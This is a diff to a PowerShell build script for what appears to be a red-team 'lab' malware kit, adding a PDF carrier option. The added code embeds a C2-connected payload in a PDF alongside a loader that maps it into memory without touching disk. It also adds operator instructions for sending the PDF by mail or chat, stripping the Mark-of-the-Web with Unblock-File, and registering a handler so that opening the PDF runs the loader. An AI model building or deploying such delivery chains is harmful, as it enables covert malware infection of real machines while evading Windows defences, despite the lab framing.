@@ -46,6 +46,20 @@
 .PARAMETER IncludeChain
     Also put the loader and the carrier PDF in the bundle.
 
+.PARAMETER Carrier
+    Build the PDF carrier: the payload embedded in a PDF, with the loader
+    beside it.
+
+    The carrier is the lab's DELIVERY PATH. The PDF carries the payload
+    as an embedded file; the loader extracts it and maps it in memory, so
+    the payload never touches the disk on the target.
+
+    The question the carrier exists to answer is whether the chain
+    survives the trip: a PDF that arrives over the internet carries the
+    Mark-of-the-Web, which is a different file to the endpoint than one
+    that arrived from a shared folder. The bundle's instructions say
+    how to handle that.
+
 .PARAMETER OutputDir
     Where the bundle goes.
 
@@ -53,7 +67,7 @@
     .\make_target_bundle.ps1 -C2Host 192.168.77.1 -C2Port 9001 -Arm all
 
 .EXAMPLE
-    .\make_target_bundle.ps1 -C2Host 192.168.77.1 -IncludeChain
+    .\make_target_bundle.ps1 -C2Host 192.168.77.1 -Arm all -Carrier
 #>
 [CmdletBinding()]
 param(
@@ -61,6 +75,7 @@ param(
     [int]$C2Port = 9001,
     [string]$Arm = 'all',
     [switch]$IncludeChain,
+    [switch]$Carrier,
     [string]$OutputDir = ''
 )
 
@@ -72,6 +87,15 @@ if (-not $OutputDir) {
     $OutputDir = Join-Path $root "dist\phantom-x-target-$Arm"
 }
 New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null
+
+# The bundle is rebuilt from scratch every time.
+#
+# A stale file left over from an earlier run is worse than no file: the
+# carrier PDF from last run points at last run's C2, and the operator
+# sends it believing it points at this one's.
+Get-ChildItem $OutputDir -File -ErrorAction SilentlyContinue |
+    Where-Object { $_.Name -notin @('manifest.json', 'START-HERE.txt') } |
+    Remove-Item -Force -ErrorAction SilentlyContinue
 
 Write-Host ''
 Write-Host ('=' * 70) -ForegroundColor DarkGray
@@ -117,15 +141,52 @@ try {
 # The optional chain files
 # ---------------------------------------------------------------------------
 $chainFiles = @()
-if ($IncludeChain) {
+if ($IncludeChain -or $Carrier) {
     $native = Join-Path $root 'dist\native'
-    foreach ($n in @('px_loader.exe', 'px_attack_chain.pdf')) {
+    foreach ($n in @('px_loader.exe')) {
         $src = Join-Path $native $n
         if (Test-Path $src) {
             Copy-Item $src $OutputDir -Force
             $chainFiles += $n
         } else {
             Write-Host "[!] missing from dist\native: $n" -ForegroundColor Yellow
+        }
+    }
+}
+
+# ---------------------------------------------------------------------------
+# The PDF carrier
+#
+# The payload goes INSIDE the PDF as an embedded file. The loader pulls
+# it out and maps it in memory, so the payload never lands on the disk of
+# the machine that opens the PDF.
+#
+# The PDF is built from the payload that was compiled for THIS bundle, so
+# it points at the same C2 address the loose binary would.
+# ---------------------------------------------------------------------------
+if ($Carrier) {
+    $payloadExe = Join-Path $OutputDir "px_payload_$Arm.exe"
+    $pdfOut = Join-Path $OutputDir "px_carrier.pdf"
+    $makePdf = Join-Path $root 'phase1_pdf\make_attack_pdf.py'
+
+    if (-not (Test-Path $makePdf)) {
+        Write-Host "[!] make_attack_pdf.py not found; no carrier built" -ForegroundColor Red
+    } else {
+        $python = Get-Command python.exe -ErrorAction SilentlyContinue
+        if (-not $python) { $python = Get-Command python3.exe -ErrorAction SilentlyContinue }
+        if (-not $python) {
+            Write-Host '[!] no Python; no carrier built' -ForegroundColor Yellow
+        } else {
+            & $python.Source $makePdf --payload $payloadExe --out $pdfOut `
+                --name "px_payload_$Arm.exe" 2>&1 |
+                Where-Object { $_ -match 'wrote|error|Error' } |
+                ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }
+            if (Test-Path $pdfOut) {
+                $chainFiles += 'px_carrier.pdf'
+                Write-Host ("    carrier : {0} bytes" -f (Get-Item $pdfOut).Length) -ForegroundColor Green
+            } else {
+                Write-Host '[!] the carrier PDF was not built' -ForegroundColor Red
+            }
         }
     }
 }
@@ -162,9 +223,47 @@ if ($chainFiles.Count -gt 0) {
     $lines += '    touches the disk: the loader extracts it from the PDF and maps'
     $lines += '    it in memory.'
     $lines += ''
-    $lines += '        .\px_loader.exe .\px_attack_chain.pdf'
+    $lines += '        .\px_loader.exe .\px_carrier.pdf'
     $lines += ''
     $lines += '    The loader writes a log beside itself: loader.log'
+    $lines += ''
+}
+if ($Carrier) {
+    $lines += ''
+    $lines += 'STEP 3 (OPTIONAL) -- THE CARRIER OVER A NETWORK HOP'
+    $lines += ''
+    $lines += '    px_carrier.pdf can be sent to the machine as a document: by'
+    $lines += '    mail, by a chat client, through a file share, or any other way'
+    $lines += '    a file travels. The payload is inside it.'
+    $lines += ''
+    $lines += '    TWO THINGS HAPPEN TO A FILE THAT ARRIVES THAT WAY, AND BOTH'
+    $lines += '    OF THEM ARE PART OF THE MEASUREMENT:'
+    $lines += ''
+    $lines += '      1. It gets the MARK-OF-THE-WEB. Windows treats a file'
+    $lines += '         from the internet differently from one that came from a'
+    $lines += '         shared folder. That is the point of the mark, and the'
+    $lines += '         lab measures what it costs.'
+    $lines += ''
+    $lines += '      2. It gets SmartScreen. A PDF that has never been seen'
+    $lines += '         is a reputation question, and the PDF carrier is a'
+    $lines += '         document with an executable in it.'
+    $lines += ''
+    $lines += '    On the receiving machine, in an elevated PowerShell:'
+    $lines += ''
+    $lines += '        Unblock-File .\px_carrier.pdf'
+    $lines += ''
+    $lines += '    That is the Mark-of-the-Web being taken off deliberately. It'
+    $lines += '    is also the difference between the two measurements, and'
+    $lines += '    the lab records which one it took.'
+    $lines += ''
+    $lines += '    The loader still has to be on the machine. To make double-'
+    $lines += '    clicking the PDF run the loader:'
+    $lines += ''
+    $lines += '        .\install_pdf_handler.ps1 -LoaderPath .\px_loader.exe'
+    $lines += ''
+    $lines += '    And then the PDF is opened the way any document is:'
+    $lines += ''
+    $lines += '        .\px_carrier.pdf'
     $lines += ''
 }
 $lines += ''
